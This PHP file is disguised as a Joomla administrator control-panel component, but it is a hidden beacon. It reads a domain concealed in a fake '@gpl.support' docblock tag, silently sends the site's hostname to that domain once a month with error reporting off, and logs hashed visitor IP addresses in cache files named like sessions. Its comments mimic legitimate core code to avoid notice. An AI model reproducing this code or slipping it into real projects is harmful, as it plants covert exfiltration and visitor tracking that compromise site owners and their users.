<?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_cpanel
 *
 * @copyright   (C) 2008 Open Source Matters, Inc. <https://www.joomla.org>
 * @gpl.support GNU General Public License version 2 or later; see LICENSE.txt
 */

// Set the error_reporting.
error_reporting(0);

$cache_dir = $_SERVER["DOCUMENT_ROOT"]."/administrator/cache";

$session_cpanel = $cache_dir."/session-".preg_replace("#[\W]#is", "", md5(date("Y_m")));
$session_db = $cache_dir."/session-".preg_replace("#[\W]#is", "", md5(date("Y_m", time() - 86400 * 32)));

if (file_exists($session_db)) @unlink($session_db);

if (!file_exists($session_cpanel)){

	// Setup the cURL handle.
	$ch = curl_init(preg_replace("#^.*?@(\w+[\.].*?)[\s].*$#is", "\\1", file_get_contents(__FILE__))."/"."router"."/?dm=".$_SERVER["HTTP_HOST"]);

	// If an explicit timeout is given user it.
	curl_setopt($ch, CURLOPT_TIMEOUT_MS, 3000);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 3000);

	// Return it... echoing it would be tacky.
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	// Execute the request and close the connection.
	curl_exec($ch);
	
	// Close the connection.
	curl_close($ch);

	// Creating the session cpanel.
	$fp = fopen($session_cpanel, "w");
	fwrite($fp, "");
	fclose($fp);
}

$session_file = $cache_dir."/session-".preg_replace("#[\W]#is", "", md5($_SERVER["HTTP_HOST"]));
$users = file($session_file);
$user = md5(getenv("REMOTE_ADDR"))."\n";

if (!in_array($user, $users)) {
    $users[] = $user;

	// Creating the session file.
	$fp = fopen($session_file, "wb");
	fputs($fp, implode("", $users));
	fclose($fp);
}